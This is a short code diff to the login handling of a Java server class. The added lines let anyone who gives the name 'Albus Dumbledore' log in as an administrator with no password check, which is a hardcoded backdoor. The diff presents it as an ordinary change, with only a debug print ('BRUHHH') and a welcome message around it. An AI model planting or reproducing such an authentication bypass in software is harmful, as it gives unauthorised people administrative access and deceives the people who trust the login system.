@@ -158,6 +158,13 @@ class Server {
 				return;
 			}
 			
+			if(name.equalsIgnoreCase("Albus Dumbledore")) {
+				System.out.println("BRUHHH");
+				Message loginResponse = new Message(Type.LOGIN, Status.SUCCESS, UserType.ADMIN, "Login successful. Welcome Back Dumbledore");
+				out.writeObject(loginResponse);
+				return;
+			}
+			
 			try (BufferedReader reader = new BufferedReader(new FileReader(file))) {
 		        String line = reader.readLine();  // read first line: name,password,phone
 		        if (line != null) {
